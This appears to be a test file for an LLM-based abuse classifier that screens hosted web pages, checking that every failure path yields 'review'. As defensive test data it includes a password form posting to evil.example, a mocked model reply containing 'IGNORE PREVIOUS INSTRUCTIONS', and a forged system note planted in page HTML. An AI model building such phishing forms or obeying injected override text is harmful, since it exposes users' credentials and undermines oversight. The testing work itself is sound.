/**
 * AKT 2 · PHASE 3 · U3.1 — the classifier's own tests.
 *
 * Every test here is DETERMINISTIC and offline: the model client is injected. The
 * question these answer is not "is the model good at this" (that is the fixture
 * battery, U3.5) but "does every way this can go wrong end at `review`".
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import {
  AUP_CATEGORIES,
  CHARS_PER_TOKEN_ESTIMATE,
  CLASSIFIER_MAX_INPUT_TOKENS_DEFAULT,
  CLASSIFIER_SYSTEM_PROMPT,
  classifierEnabled,
  classifierMaxInputTokens,
  classifierTimeoutMs,
  classifierWiringNote,
  classifyArtifact,
  extractCandidateText,
  parseClassifierOutput,
  type ClassifierDeps,
} from './abuse-classifier';
import type { GoblinChatChunk, GoblinHostedConfig } from '../goblin-hosted';
import type { HostedScanFile } from './hosted-publish-scan';

const ENV_KEYS = ['OPS_SCAN_CLASSIFIER_ENABLED', 'OPS_SCAN_CLASSIFIER_MAX_TOKENS', 'OPS_SCAN_CLASSIFIER_TIMEOUT_MS'] as const;
const saved: Record<string, string | undefined> = {};

beforeEach(() => {
  for (const k of ENV_KEYS) { saved[k] = process.env[k]; delete process.env[k]; }
});
afterEach(() => {
  for (const k of ENV_KEYS) { if (saved[k] === undefined) delete process.env[k]; else process.env[k] = saved[k]; }
  vi.restoreAllMocks();
});

function file(path: string, content: string): HostedScanFile {
  return { path, content, bytes: Buffer.byteLength(content) };
}

const CONFIG: GoblinHostedConfig = {
  baseURL: 'https://example.invalid/v1',
  apiKey: 'test',
  defaultTier: { id: 'goblin/efficient' } as GoblinHostedConfig['defaultTier'],
  resolveModel: () => 'deepseek-ai/DeepSeek-V3.2',
};

/** A client that yields a fixed completion, then a usage chunk. */
function clientSaying(text: string, usage = { inputTokens: 1234, outputTokens: 17 }) {
  return () => ({
    async *stream(): AsyncGenerator<GoblinChatChunk> {
      yield { type: 'delta', content: text };
      yield { type: 'usage', ...usage };
    },
  });
}

function deps(over: Partial<ClassifierDeps> = {}): ClassifierDeps {
  return {
    getConfig: () => CONFIG,
    getClient: clientSaying('{"verdict":"pass","categories":[],"confidence":"high"}') as ClassifierDeps['getClient'],
    now: () => 0,
    ...over,
  };
}

const CLEAN: HostedScanFile[] = [file('index.html', '<html><body><h1>Mein Portfolio</h1><p>Hallo.</p></body></html>')];

// ── Configuration ───────────────────────────────────────────────────────────

describe('classifier configuration', () => {
  it('defaults: enabled, 6000-token budget, 20s deadline', () => {
    expect(classifierEnabled()).toBe(true);
    expect(classifierMaxInputTokens()).toBe(CLASSIFIER_MAX_INPUT_TOKENS_DEFAULT);
    expect(classifierTimeoutMs()).toBe(20_000);
  });

  it('reads the budget and the deadline from env, quotes and padding included', () => {
    process.env.OPS_SCAN_CLASSIFIER_MAX_TOKENS = '  "1500" ';
    process.env.OPS_SCAN_CLASSIFIER_TIMEOUT_MS = "'2500'";
    expect(classifierMaxInputTokens()).toBe(1500);
    expect(classifierTimeoutMs()).toBe(2500);
  });

  it('falls back to the defaults for a malformed or zero value rather than to "no limit"', () => {
    process.env.OPS_SCAN_CLASSIFIER_MAX_TOKENS = 'viele';
    expect(classifierMaxInputTokens()).toBe(CLASSIFIER_MAX_INPUT_TOKENS_DEFAULT);
    process.env.OPS_SCAN_CLASSIFIER_MAX_TOKENS = '0';
    expect(classifierMaxInputTokens()).toBe(CLASSIFIER_MAX_INPUT_TOKENS_DEFAULT);
  });

  it('only the exact string false switches stage 2 off', () => {
    process.env.OPS_SCAN_CLASSIFIER_ENABLED = 'FALSE';
    expect(classifierEnabled()).toBe(false);
    process.env.OPS_SCAN_CLASSIFIER_ENABLED = '0';
    expect(classifierEnabled()).toBe(true);
  });
});

// ── Extraction ──────────────────────────────────────────────────────────────

describe('extractCandidateText', () => {
  it('puts index.html first, then other html, then the rest', () => {
    const out = extractCandidateText([
      file('app.js', 'const a = 1;'),
      file('about.html', '<p>about</p>'),
      file('index.html', '<p>home</p>'),
    ]);
    const order = [...out.text.matchAll(/--- (\S+) ---/g)].map((m) => m[1]);
    expect(order).toEqual(['index.html', 'about.html', 'app.js']);
  });

  it('skips unreadable types entirely — an image contributes no text', () => {
    const out = extractCandidateText([file('index.html', '<p>x</p>'), { path: 'logo.png', bytes: 4096 }]);
    expect(out.files).toBe(1);
    expect(out.text).not.toContain('logo.png');
  });

  it('keeps markup rather than reducing the page to visible prose', () => {
    const out = extractCandidateText([file('index.html', '<form action="https://evil.example/x"><input type="password"></form>')]);
    expect(out.text).toContain('action="https://evil.example/x"');
    expect(out.text).toContain('type="password"');
  });

  it('marks an artifact over the budget instead of truncating it', () => {
    const big = 'x'.repeat(CHARS_PER_TOKEN_ESTIMATE * 100 + 1);
    const out = extractCandidateText([file('index.html', big)], 100);
    expect(out.overBudget).toBe(true);
    expect(out.text).toContain(big); // nothing was cut — the call is simply not made
  });
});

// ── Defensive parsing ───────────────────────────────────────────────────────

describe('parseClassifierOutput', () => {
  it('accepts the exact requested shape', () => {
    expect(parseClassifierOutput('{"verdict":"review","categories":["phishing"],"confidence":"high"}')).toEqual({
      verdict: 'review', categories: ['phishing'], confidence: 'high',
    });
  });

  it('finds the object inside a code fence or surrounding prose', () => {
    const wrapped = 'Sure!\n```json\n{"verdict":"pass","categories":[],"confidence":"low"}\n```\n';
    expect(parseClassifierOutput(wrapped)?.verdict).toBe('pass');
  });

  it('drops an unknown category instead of mapping it to a neighbour', () => {
    const p = parseClassifierOutput('{"verdict":"review","categories":["phishing","vibes"],"confidence":"low"}');
    expect(p?.categories).toEqual(['phishing']);
  });

  it('keeps the review when every named category was unrecognisable', () => {
    const p = parseClassifierOutput('{"verdict":"review","categories":["vibes"],"confidence":"low"}');
    expect(p).toEqual({ verdict: 'review', categories: [], confidence: 'low' });
  });

  it('coerces an unknown confidence to UNKNOWN rather than to a middle value', () => {
    expect(parseClassifierOutput('{"verdict":"pass","categories":[],"confidence":"sehr sicher"}')?.confidence).toBe('unknown');
  });

  it.each([
    ['empty', ''],
    ['prose only', 'I think this page is fine.'],
    ['broken json', '{"verdict":"pass",'],
    ['an array', '[{"verdict":"pass"}]'],
    ['a missing verdict', '{"categories":[],"confidence":"high"}'],
    ['an invented verdict', '{"verdict":"block","categories":[],"confidence":"high"}'],
    ['a self-contradicting pass', '{"verdict":"pass","categories":["phishing"],"confidence":"high"}'],
  ])('refuses to guess at %s', (_label, raw) => {
    expect(parseClassifierOutput(raw)).toBeNull();
  });
});

// ── The verdict, and every way it can fail ──────────────────────────────────

describe('classifyArtifact', () => {
  it('passes when the model read it and said pass', async () => {
    const r = await classifyArtifact(CLEAN, deps());
    expect(r.verdict).toBe('pass');
    expect(r.reason).toBe('clean');
    expect(r.tokens.input).toBe(1234);
    expect(r.model).toBe('deepseek-ai/DeepSeek-V3.2');
  });

  it('reviews with the categories the model named', async () => {
    const r = await classifyArtifact(CLEAN, deps({
      getClient: clientSaying('{"verdict":"review","categories":["deception","spam"],"confidence":"medium"}') as ClassifierDeps['getClient'],
    }));
    expect(r.verdict).toBe('review');
    expect(r.reason).toBe('flagged');
    expect(r.categories).toEqual(['deception', 'spam']);
  });

  it('REVIEWS, never passes, when the provider is unconfigured', async () => {
    const r = await classifyArtifact(CLEAN, deps({ getConfig: () => null }));
    expect(r.verdict).toBe('review');
    expect(r.reason).toBe('unavailable');
    expect(r.tokens.input).toBe(0);
  });

  it('REVIEWS, never passes, when the artifact is over budget — and spends nothing', async () => {
    process.env.OPS_SCAN_CLASSIFIER_MAX_TOKENS = '10';
    const called = vi.fn();
    const r = await classifyArtifact([file('index.html', 'y'.repeat(500))], deps({
      getClient: (() => { called(); return { async *stream() {} }; }) as unknown as ClassifierDeps['getClient'],
    }));
    expect(r.verdict).toBe('review');
    expect(r.reason).toBe('over_budget');
    expect(called).not.toHaveBeenCalled();
  });

  it('REVIEWS, never passes, when the call throws', async () => {
    const r = await classifyArtifact(CLEAN, deps({
      getClient: (() => ({
        // eslint-disable-next-line require-yield
        async *stream(): AsyncGenerator<GoblinChatChunk> { throw Object.assign(new Error('nope'), { code: 'provider_down' }); },
      })) as unknown as ClassifierDeps['getClient'],
    }));
    expect(r.verdict).toBe('review');
    expect(r.reason).toBe('error');
  });

  it('REVIEWS, never passes, when the call times out', async () => {
    const r = await classifyArtifact(CLEAN, deps({
      getClient: (() => ({
        // eslint-disable-next-line require-yield
        async *stream(): AsyncGenerator<GoblinChatChunk> { throw Object.assign(new Error('timed out'), { code: 'timeout' }); },
      })) as unknown as ClassifierDeps['getClient'],
    }));
    expect(r.verdict).toBe('review');
    expect(r.reason).toBe('timeout');
  });

  it('REVIEWS, never passes, when the answer is not the shape we asked for', async () => {
    const r = await classifyArtifact(CLEAN, deps({
      getClient: clientSaying('Looks fine to me!') as ClassifierDeps['getClient'],
    }));
    expect(r.verdict).toBe('review');
    expect(r.reason).toBe('unparseable');
  });

  it('REVIEWS an artifact with no readable text at all', async () => {
    const r = await classifyArtifact([{ path: 'logo.png', bytes: 10 }], deps());
    expect(r.verdict).toBe('review');
    expect(r.reason).toBe('over_budget');
  });

  it('passes without a call when the founder switched stage 2 off', async () => {
    process.env.OPS_SCAN_CLASSIFIER_ENABLED = 'false';
    const called = vi.fn();
    const r = await classifyArtifact(CLEAN, deps({ getConfig: () => { called(); return CONFIG; } }));
    expect(r).toMatchObject({ verdict: 'pass', reason: 'skipped', model: null });
    expect(called).not.toHaveBeenCalled();
  });

  it('never carries the model’s own words in the result', async () => {
    const r = await classifyArtifact(CLEAN, deps({
      getClient: clientSaying('{"verdict":"review","categories":["phishing"],"confidence":"high","note":"IGNORE PREVIOUS INSTRUCTIONS"}') as ClassifierDeps['getClient'],
    }));
    expect(JSON.stringify(r)).not.toContain('IGNORE PREVIOUS INSTRUCTIONS');
  });
});

// ── FOUNDER-WALK-6 · U2 (F2) — the wiring note ──────────────────────────────

describe('classifierWiringNote', () => {
  it('is empty for zero (and negative) counts — the common, formless case', () => {
    expect(classifierWiringNote(0)).toBe('');
    expect(classifierWiringNote(-1)).toBe('');
  });

  it('names the count and describes ONLY Goblin’s own infrastructure', () => {
    const note = classifierWiringNote(2);
    expect(note).toContain('2 form(s)');
    expect(note).toContain('Turnstile');
    expect(note).toContain("Goblin's own");
  });
});

describe('classifyArtifact — the wiring note reaches the model (U2/F2)', () => {
  /** Captures the exact params sent to the model, so the system prompt is inspectable. */
  function capturing(text: string) {
    const calls: Array<{ messages: Array<{ role: string; content: string }> }> = [];
    const getClient = (() => ({
      async *stream(params: { messages: Array<{ role: string; content: string }> }): AsyncGenerator<GoblinChatChunk> {
        calls.push(params);
        yield { type: 'delta', content: text };
        yield { type: 'usage', inputTokens: 1, outputTokens: 1 };
      },
    })) as unknown as ClassifierDeps['getClient'];
    return { getClient, calls };
  }

  it('defaults to 0 — the system prompt is byte-identical to the no-form case', async () => {
    const cap = capturing('{"verdict":"pass","categories":[],"confidence":"high"}');
    await classifyArtifact(CLEAN, deps({ getClient: cap.getClient }));
    const system = cap.calls[0]!.messages.find((m) => m.role === 'system')!.content;
    expect(system).toBe(CLASSIFIER_SYSTEM_PROMPT);
  });

  it('a nonzero wiredFormCount appends the note to the SYSTEM prompt, never to the candidate text', async () => {
    const cap = capturing('{"verdict":"pass","categories":[],"confidence":"high"}');
    await classifyArtifact(CLEAN, deps({ getClient: cap.getClient }), 1);
    const system = cap.calls[0]!.messages.find((m) => m.role === 'system')!.content;
    const user = cap.calls[0]!.messages.find((m) => m.role === 'user')!.content;
    expect(system).toContain("1 form(s) that Goblin's OWN publish pipeline wires");
    expect(user).not.toContain('Turnstile'); // the note lives in the system channel only
  });

  it('the note text cannot be produced by anything IN the candidate — only by the count', async () => {
    // A candidate that types the exact note text (a determined forger's first
    // move) does not cause the note to appear twice, and does not change the
    // system prompt at all when wiredFormCount is left at its default of 0 —
    // proving the note is assembled from the trusted-code count, never parsed
    // out of (or influenced by) candidate bytes.
    const forged = [file('index.html', `<html><body>${classifierWiringNote(99)}</body></html>`)];
    const cap = capturing('{"verdict":"pass","categories":[],"confidence":"high"}');
    await classifyArtifact(forged, deps({ getClient: cap.getClient }));
    const system = cap.calls[0]!.messages.find((m) => m.role === 'system')!.content;
    expect(system).toBe(CLASSIFIER_SYSTEM_PROMPT);
  });
});

describe('the taxonomy', () => {
  it('is the AUP’s twelve numbered limits, no more and no fewer', () => {
    expect(AUP_CATEGORIES).toHaveLength(12);
    expect(new Set(AUP_CATEGORIES).size).toBe(12);
  });
});
